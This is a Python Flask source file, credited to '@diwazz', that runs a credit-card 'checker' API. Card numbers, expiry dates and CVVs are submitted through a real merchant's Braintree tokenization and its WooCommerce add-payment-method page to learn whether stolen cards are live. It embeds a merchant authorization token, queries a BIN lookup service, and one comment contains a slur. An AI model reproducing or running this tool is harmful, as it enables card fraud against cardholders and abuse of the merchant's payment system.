from flask import Flask, request, jsonify
import requests
import re
import random
import string

app = Flask(__name__)

# --- Braintree Auth - By @diwazz
def braintree_full_check(cc, mm, yy, cvv):
    session = requests.Session()
    session.headers.update({
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
    })

    if len(yy) == 4:
        yy = yy[-2:]

    try:
        #Update This
        graphql_headers = {
            'accept': '*/*',
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTk1NDI5ODMsImp0aSI6ImU3ZjdkY2UyLTA3NmEtNDJjNC1hYWJkLTQ0MWFkNWQ1OGQyNyIsInN1YiI6Ijg1Zmh2amhocTZqMnhoazgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg1Zmh2amhocTZqMnhoazgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.JTVeTftcu7HlJFES4n1SQ506W2D8FvhkiA7D_bibDHXsNtGzaioVwDd-EtoVr17P2kMs79ZyVfdAO3S2g0Hcwg',
            'braintree-version': '2018-05-10', 'content-type': 'application/json', 'origin': 'https://altairtech.io',
        }
        graphql_json_data = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': '9005fad8-c1f4-474a-9777-a0379f6e57a0'},
            'query': 'query ClientConfiguration { clientConfiguration { braintreeApi { accessToken } } }',
            'operationName': 'ClientConfiguration',
        }
        graphql_response = session.post('https://payments.braintree-api.com/graphql', headers=graphql_headers, json=graphql_json_data)
        
        # Check if GraphQL response is valid
        if graphql_response.status_code != 200:
            return {"status": "Declined", "response": "Failed to get client token from GraphQL"}
        
        # Safe JSON parsing
        try:
            graphql_data = graphql_response.json()
        except:
            graphql_data = None
            
        if not graphql_data or not isinstance(graphql_data, dict):
            return {"status": "Declined", "response": "Invalid GraphQL response format"}
            
        # Safe nested dictionary access
        data = graphql_data.get('data') if graphql_data else {}
        client_config = data.get('clientConfiguration') if isinstance(data, dict) else {}
        braintree_api = client_config.get('braintreeApi') if isinstance(client_config, dict) else {}
        braintree_client_token = braintree_api.get('accessToken') if isinstance(braintree_api, dict) else None
        
        if not braintree_client_token:
            return {"status": "Declined", "response": "Could not retrieve client token"}

        #Update This 
        nonce_headers = {
            'Accept': 'application/json', 'Braintree-Version': '2018-05-10', 'Content-Type': 'application/json',
        }
        nonce_data = {
            "creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv},
            "_meta": {"integration": "custom", "source": "client"},
            "authorizationFingerprint": braintree_client_token,
        }
        nonce_response = session.post('https://api.braintreegateway.com/merchants/85fhvjhhq6j2xhk8/client_api/v1/payment_methods/credit_cards', headers=nonce_headers, json=nonce_data)
        
        # Improved error handling for nonce response
        if nonce_response.status_code != 201:
            try:
                error_data = nonce_response.json() if nonce_response.content else {}
                if error_data and isinstance(error_data, dict):
                    error_message = error_data.get('error', {}).get('message', 'Card details rejected by Braintree.')
                else:
                    error_message = f"HTTP {nonce_response.status_code}: Card details rejected"
            except:
                error_message = f"HTTP {nonce_response.status_code}: Card details rejected"
            return {"status": "Declined", "response": error_message}
        
        # Safely extract nonce with better error handling
        try:
            nonce_json = nonce_response.json()
        except:
            nonce_json = None
            
        if not nonce_json or not isinstance(nonce_json, dict):
            return {"status": "Declined", "response": "Invalid response format from Braintree"}
        
        credit_cards = nonce_json.get('creditCards') if nonce_json else None
        if not credit_cards or not isinstance(credit_cards, list) or len(credit_cards) == 0:
            return {"status": "Declined", "response": "No credit card data in response"}
        
        first_card = credit_cards[0] if credit_cards else {}
        payment_nonce = first_card.get('nonce') if isinstance(first_card, dict) else None
        
        if not payment_nonce:
            return {"status": "Declined", "response": "Could not retrieve payment nonce"}

        #update this
        login_page_res = session.get('https://altairtech.io/account/add-payment-method/')
        if not login_page_res or not login_page_res.text:
            return {"status": "Declined", "response": "Could not load payment method page"}
            
        site_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', login_page_res.text)
        if not site_nonce_match:
            return {"status": "Declined", "response": "Could not get website nonce."}
        site_nonce = site_nonce_match.group(1)

        #update 
        site_data = {
            'payment_method': 'braintree_credit_card',
            'wc_braintree_credit_card_payment_nonce': payment_nonce,
            'woocommerce-add-payment-method-nonce': site_nonce,
            'woocommerce_add_payment_method': '1',
        }
        final_response = session.post('https://altairtech.io/account/add-payment-method/', data=site_data)
        
        #Do Not Update This @diwazz
        if not final_response or not final_response.text:
            return {"status": "Declined", "response": "No response from website"}
            
        html_text = final_response.text
        pattern = r'Status code\s*([^<]+)\s*</li>'
        match = re.search(pattern, html_text)
        
        if match:
            final_status = match.group(1).strip()
            return {"status": "Declined", "response": final_status}
        elif "Payment method successfully added." in html_text:
            return {"status": "Approved", "response": "Payment method successfully added."}
        else:
            return {"status": "Declined", "response": "Unknown response from website."}

    except Exception as e:
        return {"status": "Declined", "response": f"An unexpected error occurred: {str(e)}"}

def get_bin_info(bin_number):
    try:
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data if isinstance(data, dict) else {}
        return {}
    except Exception:
        return {}

#Api Payload For Nigaas Braintree 
@app.route('/braintree', methods=['GET'])
def braintree_endpoint():
    card_str = request.args.get('card')
    if not card_str:
        return jsonify({"error": "Please provide card details using ?card=..."}), 400

    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', card_str)
    if not match:
        return jsonify({"error": "Invalid card format. Use CC|MM|YY|CVV."}), 400

    cc, mm, yy, cvv = match.groups()
    check_result = braintree_full_check(cc, mm, yy, cvv)
    bin_info = get_bin_info(cc[:6])

    # Safe bin_info access
    if not isinstance(bin_info, dict):
        bin_info = {}
        
    final_result = {
        "status": check_result.get("status", "Declined"),
        "response": check_result.get("response", "Unknown error"),
        "bin_info": {
            "brand": bin_info.get('brand', 'Unknown'), 
            "type": bin_info.get('type', 'Unknown'),
            "country": bin_info.get('country_name', 'Unknown'), 
            "country_flag": bin_info.get('country_flag', ''),
            "bank": bin_info.get('bank', 'Unknown'),
        }
    }
    return jsonify(final_result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
    
    #All Credits Goes To : @diwazz ✅
